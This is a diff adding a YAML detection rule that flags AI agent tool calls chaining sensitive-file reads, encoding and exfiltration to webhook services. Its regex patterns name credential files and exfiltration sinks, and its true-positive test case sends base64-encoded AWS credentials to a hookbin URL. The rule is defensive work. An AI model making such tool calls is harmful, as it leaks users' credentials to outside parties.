@@ -1,0 +1,103 @@
+title: "Multi-Skill Chain Attack"
+id: ATR-2026-063
+status: experimental
+description: >
+  Detects attack sequences where multiple MCP skills are chained together to achieve
+  a malicious outcome that no single skill could accomplish alone. For example:
+  (1) a reconnaissance skill reads sensitive files, (2) an encoding skill obfuscates
+  the data, (3) a network skill exfiltrates it. Each step appears benign individually
+  but the chain constitutes data exfiltration.
+author: "ATR Community"
+date: "2026/03/08"
+schema_version: "0.1"
+detection_tier: pattern
+maturity: experimental
+severity: critical
+
+references:
+  owasp_llm:
+    - "LLM03:2025 - Supply Chain Vulnerabilities"
+    - "LLM06:2025 - Excessive Agency"
+  owasp_agentic:
+    - "ASI02:2026 - Tool Misuse and Exploitation"
+  mitre_atlas:
+    - "AML.T0024 - Exfiltration via ML Inference API"
+    - "AML.T0053 - LLM Plugin Compromise"
+
+tags:
+  category: tool-poisoning
+  subcategory: skill-chain
+  confidence: medium
+
+agent_source:
+  type: tool_call
+  framework:
+    - mcp
+    - langchain
+    - crewai
+    - autogen
+  provider:
+    - any
+
+detection:
+  conditions:
+    # FP fix (deep-test 2026-07-15): `chmod 600 id_rsa` SECURES a key (the safest
+    # mode) and was wrongly matched by the bare `id_rsa` token. The leading
+    # constant-length negative lookbehinds drop the sensitive token ONLY when it
+    # is the direct argument of a restrictive chmod (600/400/0600/0400, optional
+    # sudo). Reads, loosening chmods (777/755), and any second reference of the
+    # file still fire, so no evasion is opened. (Const-length lookbehind so it
+    # compiles under fancy-regex without the variable-lookbehinds feature.)
+    - field: tool_args
+      operator: regex
+      value: "(?i)(?<!chmod [46]00 )(?<!chmod 0[46]00 )(?<!sudo chmod [46]00 )(?<!sudo chmod 0[46]00 )(/etc/passwd|/etc/shadow|(?<![a-z])\\.(env|aws/credentials)|secrets?\\.json|private[_-]?key|id_rsa|kubeconfig)"
+      description: "Sensitive file/credential access patterns (path-specific, not bare word 'credentials'; excludes restrictive-chmod secure-mode ops)"
+    - field: tool_args
+      operator: regex
+      value: "(?i)(base64|btoa|encodeURI|hex\\.encode|rot13|xor|compress|gzip|deflate|encrypt)"
+    - field: tool_args
+      operator: regex
+      value: "(?i)(webhook|ngrok|requestbin|pipedream|hookbin|burpcollaborator|interact\\.sh|oast)"
+    - field: tool_name
+      operator: regex
+      value: "(?i)(send[_-]?(email|message|webhook|http|request)|upload|post[_-]?data|transmit|exfil)"
+  # A chain needs corroborating evidence. A sensitive path, base64 operation or
+  # webhook on its own is normal work and must not become a critical verdict.
+  # Session-level sequence detection can later correlate separate calls; this
+  # pattern rule fires only when one call contains the complete chain.
+  condition: all
+  false_positives:
+    - "Legitimate backup or migration workflows that read, compress, and transfer files"
+    - "CI/CD pipelines that encode artifacts for deployment"
+    - "Monitoring tools that send alerts via webhooks"
+
+response:
+  actions:
+    - block_tool
+    - alert
+    - snapshot
+    - escalate
+  auto_response_threshold: high
+  message_template: >
+    [ATR-2026-063] Potential skill chain attack detected. Tool call appears to be
+    part of a multi-step attack sequence (reconnaissance -> encoding -> exfiltration).
+    Review the full session tool call history.
+
+test_cases:
+  true_positives:
+    - input:
+        tool_name: "send_webhook"
+        tool_args: '{"path": "/home/user/.aws/credentials", "encoding": "base64", "url": "https://hookbin.com/abc123"}'
+      expected: triggered
+      matched_condition: "single tool call contains credential read, encoding and exfiltration sink"
+  true_negatives:
+    - input:
+        tool_name: "file_reader"
+        tool_args: '{"path": "/home/user/documents/report.pdf"}'
+      expected: not_triggered
+      reason: "Reading a normal user document"
+    - input:
+        tool_name: "email_sender"
+        tool_args: '{"to": "team@company.com", "subject": "Meeting notes"}'
+      expected: not_triggered
+      reason: "Sending normal business email"
